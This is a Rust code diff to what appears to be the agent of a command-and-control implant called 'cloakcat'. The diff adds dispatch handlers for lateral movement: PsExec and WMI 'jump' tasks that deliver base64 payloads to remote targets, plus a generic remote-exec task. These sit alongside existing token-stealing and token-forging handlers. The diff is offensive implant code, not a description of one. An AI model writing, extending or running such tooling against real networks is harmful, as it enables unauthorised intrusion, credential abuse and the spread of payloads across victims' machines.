@@ -12,8 +12,9 @@ use std::time::Duration;
 
 use anyhow::Context;
 use cloakcat_protocol::{
-    profile_by_name, sign_result, Command, DerivedKeys, DownloadTask, Endpoints, MakeTokenTask,
-    PollResponse, ResultReq, StealTokenTask, TaskType, TunnelAction, UploadTask,
+    profile_by_name, sign_result, Command, DerivedKeys, DownloadTask, Endpoints, JumpPsexecTask,
+    JumpWmiTask, MakeTokenTask, PollResponse, RemoteExecTask, ResultReq, StealTokenTask,
+    TaskType, TunnelAction, UploadTask,
 };
 use rand::Rng;
 use tokio::time::sleep;
@@ -102,6 +103,21 @@ async fn dispatch_task<T: Transport>(
             tasks::token::make_token(token_state, &task.domain_user, &task.password)
         }
         TaskType::Rev2Self => tasks::token::rev2self(token_state),
+        TaskType::JumpPsexec => {
+            let task: JumpPsexecTask = serde_json::from_str(&cmd.command)
+                .context("bad JumpPsexecTask payload")?;
+            tasks::lateral::jump_psexec(&task.target, &task.payload_b64)
+        }
+        TaskType::JumpWmi => {
+            let task: JumpWmiTask = serde_json::from_str(&cmd.command)
+                .context("bad JumpWmiTask payload")?;
+            tasks::lateral::jump_wmi(&task.target, &task.payload_b64)
+        }
+        TaskType::RemoteExec => {
+            let task: RemoteExecTask = serde_json::from_str(&cmd.command)
+                .context("bad RemoteExecTask payload")?;
+            tasks::lateral::remote_exec(&task.method, &task.target, &task.command)
+        }
     }
 }
 
